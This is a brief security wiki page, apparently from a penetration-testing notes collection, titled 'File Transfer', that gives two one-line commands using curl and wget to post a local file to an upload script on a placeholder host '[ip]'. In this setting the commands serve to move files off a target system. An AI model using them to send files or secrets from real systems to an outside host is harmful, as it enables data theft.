---
title: File Transfer
date: M01-29-2023
author: i4
---

See [Security/Windows/File Transfer](/wiki/Security/Windows/File%20Transfer.md) for a PHP script that support `php://input` 

## Curl
```bash
curl -F 'data=@[path to file]' http://[ip]/upload.php
```
## Wget
```bash
wget --post-file [path to file] http://[ip]/upload.php
```
